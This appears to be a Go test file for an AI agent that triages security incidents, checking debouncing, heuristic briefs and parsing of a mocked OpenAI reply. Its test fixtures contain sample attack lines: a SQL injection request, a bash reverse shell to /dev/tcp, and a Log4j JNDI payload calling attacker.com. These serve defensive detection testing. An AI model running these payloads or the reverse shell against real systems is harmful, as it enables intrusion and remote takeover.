package ai_agent

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func TestAgentDebouncingLogic(t *testing.T) {
	agent := NewAgent(Config{
		ScoreThreshold: 85,
		DebounceWindow: 2 * time.Second,
	})

	ip := "198.51.100.44"
	rule := "sigma-web-sqli"

	// 1. First event should qualify
	if !agent.ShouldAnalyze(95, ip, rule) {
		t.Fatalf("Expected first critical event to trigger analysis")
	}

	// 2. Immediate second event for the same IP must be debounced
	if agent.ShouldAnalyze(95, ip, rule) {
		t.Fatalf("Expected immediate duplicate event for %s to be debounced", ip)
	}

	// 3. Different IP should NOT be debounced
	differentIP := "203.0.113.88"
	if !agent.ShouldAnalyze(95, differentIP, rule) {
		t.Fatalf("Expected event for different IP %s to trigger analysis", differentIP)
	}

	// 4. Low threat score should NOT trigger
	if agent.ShouldAnalyze(30, "198.51.100.99", "normal_scan") {
		t.Fatalf("Expected low threat score 30 to not trigger analysis")
	}

	// 5. After debounce window expires, should qualify again
	time.Sleep(2100 * time.Millisecond)
	if !agent.ShouldAnalyze(95, ip, rule) {
		t.Fatalf("Expected analysis to qualify after debounce window expired")
	}
}

func TestLocalHeuristicTriageGeneration(t *testing.T) {
	agent := NewAgent(Config{Provider: "local"})

	// Test 1: SQL Injection
	icSQLi := &IncidentContext{
		NodeID:           "node-edge-1",
		Source:           "nginx",
		RawLine:          `GET /search?id=1 UNION SELECT null,username,password FROM users-- HTTP/1.1`,
		ClientIP:         "198.51.100.44",
		StatusCode:       200,
		ThreatScore:      95,
		RuleID:           "sigma-web-sqli",
		MitreTechniqueID: "T1190",
		CountryCode:      "US",
		CountryName:      "United States",
		FlagEmoji:        "🇺🇸",
		ASN:              "AS16509 Amazon AWS",
	}

	brief, err := agent.AnalyzeIncident(context.Background(), icSQLi)
	if err != nil || brief == nil {
		t.Fatalf("AnalyzeIncident failed: %v", err)
	}

	if !strings.Contains(brief.VectorAndTarget, "SQL Injection") {
		t.Errorf("Expected SQL Injection vector, got: %s", brief.VectorAndTarget)
	}
	if !strings.Contains(brief.ThreatAssessment, "exfiltration") {
		t.Errorf("Expected database exfiltration assessment, got: %s", brief.ThreatAssessment)
	}
	if brief.ConfidenceScore < 90 {
		t.Errorf("Expected high confidence score (>=90), got: %d", brief.ConfidenceScore)
	}
	if !strings.Contains(brief.RawMarkdown, "🎯 **Vector & Target:**") {
		t.Errorf("Expected structured 4-bullet markdown, got: %s", brief.RawMarkdown)
	}

	// Test 2: Reverse Shell
	icShell := &IncidentContext{
		NodeID:           "node-edge-1",
		Source:           "auditd",
		RawLine:          `bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`,
		ClientIP:         "198.51.100.22",
		ThreatScore:      98,
		RuleID:           "sigma-linux-revshell",
		MitreTechniqueID: "T1059.004",
	}

	briefShell, err := agent.AnalyzeIncident(context.Background(), icShell)
	if err != nil || briefShell == nil {
		t.Fatalf("AnalyzeIncident for revshell failed: %v", err)
	}
	if !strings.Contains(briefShell.VectorAndTarget, "Reverse Shell") {
		t.Errorf("Expected Reverse Shell in vector, got: %s", briefShell.VectorAndTarget)
	}

	// Test 3: Sudo Execution (Host Local)
	icSudo := &IncidentContext{
		NodeID:           "node-edge-1",
		Source:           "auth",
		RawLine:          `sudo: ubuntu : COMMAND=/bin/bash`,
		ClientIP:         "127.0.0.1",
		ThreatScore:      25,
		RuleID:           "sudo_execution",
		MitreTechniqueID: "T1078",
	}
	briefSudo, err := agent.AnalyzeIncident(context.Background(), icSudo)
	if err != nil || briefSudo == nil {
		t.Fatalf("AnalyzeIncident for sudo failed: %v", err)
	}
	if !strings.Contains(briefSudo.EnforcedMitigation, "HOST_CONTAINED") {
		t.Errorf("Expected HOST_CONTAINED mitigation for sudo, got: %s", briefSudo.EnforcedMitigation)
	}

	// Verify history retrieval
	history := agent.GetRecentBriefs(10)
	if len(history) != 3 {
		t.Errorf("Expected 3 recorded briefs in history, got %d", len(history))
	}
}

func TestMockOpenAIAPIResponseParsing(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{
			"choices": [
				{
					"message": {
						"content": "{\"vector_and_target\":\"Remote Code Execution probe targeting /api/v1 on node-1\",\"threat_assessment\":\"Attacker attempting Log4j JNDI injection to hijack system privileges.\",\"enforced_mitigation\":\"XDP_DROP (eBPF Fast-Path Filter)\",\"recommended_action\":\"Patch vulnerable Java logging dependencies and review network connections.\",\"confidence_score\":98}"
					}
				}
			]
		}`))
	}))
	defer mockServer.Close()

	agent := NewAgent(Config{
		Provider: "openai",
		APIKey:   "test-key",
		Endpoint: mockServer.URL,
		Model:    "gpt-4o-mini",
	})

	ic := &IncidentContext{
		NodeID:           "node-1",
		Source:           "nginx",
		RawLine:          `GET /api/v1?payload=${jndi:ldap://attacker.com/a} HTTP/1.1`,
		ClientIP:         "198.51.100.55",
		ThreatScore:      99,
		RuleID:           "sigma-web-rce",
		MitreTechniqueID: "T1190",
	}

	brief, err := agent.AnalyzeIncident(context.Background(), ic)
	if err != nil || brief == nil {
		t.Fatalf("Mock OpenAI AnalyzeIncident failed: %v", err)
	}

	if !strings.Contains(brief.VectorAndTarget, "Remote Code Execution") {
		t.Errorf("Expected RCE vector from mock OpenAI, got: %s", brief.VectorAndTarget)
	}
	if brief.ConfidenceScore != 98 {
		t.Errorf("Expected confidence score 98, got %d", brief.ConfidenceScore)
	}
}
